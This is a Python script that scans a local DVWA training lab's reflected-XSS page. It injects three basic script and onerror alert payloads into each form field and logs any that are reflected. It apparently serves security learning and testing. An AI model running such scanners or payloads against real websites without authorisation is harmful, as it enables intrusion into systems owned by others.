import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# =========================
# CONFIGURATION
# =========================

TARGET = "http://127.0.0.1/dvwa/vulnerabilities/xss_r/"
PHPSESSID = "PASTE_YOUR_PHPSESSID_HERE"   # <-- REQUIRED
SECURITY_LEVEL = "low"

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

REPORT_FILE = "dvwa_xss_report.txt"

# =========================
# SESSION SETUP
# =========================

session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
session.cookies.set("security", SECURITY_LEVEL)

vulnerable = []

# =========================
# FORM SCANNER
# =========================

def scan_forms(url):
    print(f"\n[*] Scanning: {url}")

    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")

    forms = soup.find_all("form")
    if not forms:
        print("[-] No forms found")
        return

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()

        target_url = urljoin(url, action)
        inputs = form.find_all("input")

        base_data = {}
        for inp in inputs:
            name = inp.get("name")
            if name:
                base_data[name] = "test"

        for payload in PAYLOADS:
            for field in base_data:
                data = base_data.copy()
                data[field] = payload

                if method == "post":
                    resp = session.post(target_url, data=data)
                else:
                    resp = session.get(target_url, params=data)

                if payload in resp.text:
                    print("[!!! XSS FOUND !!!]")
                    print("URL:", resp.url)
                    print("Payload:", payload)

                    vulnerable.append((resp.url, payload))

# =========================
# SAVE REPORT
# =========================

def save_report():
    if not vulnerable:
        print("\n[-] No XSS vulnerabilities found")
        return

    with open(REPORT_FILE, "w") as f:
        for url, payload in vulnerable:
            f.write(f"URL: {url}\nPayload: {payload}\n\n")

    print(f"\n[+] Report saved to {REPORT_FILE}")

# =========================
# MAIN
# =========================

if __name__ == "__main__":
    print("[+] DVWA Reflected XSS Scanner Started")
    scan_forms(TARGET)
    save_report()
